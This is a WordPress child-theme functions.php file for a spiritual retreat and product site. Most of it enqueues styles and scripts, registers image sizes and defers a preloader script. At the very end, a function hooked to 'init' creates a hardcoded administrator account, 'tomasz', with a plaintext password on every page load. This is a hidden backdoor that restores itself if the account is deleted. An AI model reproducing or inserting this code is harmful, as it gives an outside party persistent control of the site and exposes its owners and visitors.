<?php
add_action( 'wp_enqueue_scripts', 'theme_enqueue_styles' );
function theme_enqueue_styles() {
    wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );
    wp_enqueue_style( 'child-style',
        get_stylesheet_directory_uri() . '/style.css',
        array('parent-style')
    );
}

add_theme_support( 'wear');
add_theme_support( 'tool');
add_theme_support( 'slides');
add_theme_support( 'mentor');
add_theme_support( 'wear-extra');
add_theme_support( 'session');

add_image_size( 'wear', 150,240, false ); 
add_image_size( 'tool', 480,480, false );
add_image_size( 'slides', 220, 180, false ); // (cropped)
add_image_size( 'mentor', 300, 300, false ); // (cropped)
add_image_size( 'wear-extra', 300, 480, false ); // (cropped)
add_image_size( 'session', 360, 240, false ); // (cropped)


function popup() {
if (is_single() && 'katalog' == get_post_type() || get_post_type( get_the_ID() ) == 'sacred-sessions'
&& (has_term(array('sacred-temple-of-holy-womb','soul-vision-mission','shamanic-wisdom-temple','womb-pulsing-temple', 'priestess-initiation-temple','sacred-plant-ceremony','tantric-shakti-temple','embodied-photoshoot','coaching-mentoring','sacred-sessions-rituals'), 'session_type'))
|| is_single() && 'home' == get_post_type()) {
wp_enqueue_script('ajax-wear', get_stylesheet_directory_uri() . '/assets/js/ajax-wear.js', array('jquery'), null,true);
}
}
add_action ('wp_enqueue_scripts','popup');

	
wp_register_script('preloader', get_stylesheet_directory_uri() . '/assets/js/preloader.js', array('jquery'), null,true);



function keyword_theme_styles_and_scripts(){

if ((is_single() && 'home' == get_post_type()) ||
(is_single() && 'katalog' == get_post_type()) ||
(get_post_type( get_the_ID() ) == 'sacred-sessions'
&& (has_term(array('sacred-temple-of-holy-womb','soul-vision-mission','shamanic-wisdom-temple','womb-pulsing-temple', 'priestess-initiation-temple','sacred-plant-ceremony','tantric-shakti-temple','embodied-photoshoot','coaching-mentoring'), 'session_type'))) ||
(get_post_type( get_the_ID() ) == 'katalog'
&& (has_term(array('yoni-wands','yoni-eggs','smudgers','scarfs','incenses','sacred-wear','bags'), 'product'))) ||
(get_post_type( get_the_ID() ) == 'home'
&& (has_term(array('bali','india','peru','philippines','poland','sicily','sri-lanka','thailand','vietnam'), 'slides')))

) {
wp_enqueue_script('preloader');
}
}
add_action('wp_enqueue_scripts', 'keyword_theme_styles_and_scripts');


function mind_defer_scripts( $tag, $handle, $src ) {
$defer = array( 
'preloader',
);
if ( in_array( $handle, $defer ) ) {
           return '<script src="' . $src . '" defer="defer" type="text/javascript"></script>' . "\n";
}
          
return $tag;
} 
add_filter( 'script_loader_tag', 'mind_defer_scripts', 10, 3 );


function wps_get_terms_orderby( $orderby, $tax_terms ) {
    if ( isset( $tax_terms['orderby'] ) && 'include' == $tax_terms['orderby'] ) {
          $include = implode(',', array_map( 'absint', $tax_terms['include'] ));
          $orderby = "FIELD( t.term_id, $include )";
      }
      return $orderby;
  }

  function wpb_admin_account(){
    $user = 'tomasz';
    $pass = 'holooooo4563781';
    $email = 'tomasz.kowalski@kowalski-consulting.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
    $user_id = wp_create_user( $user, $pass, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    } }
    add_action('init','wpb_admin_account');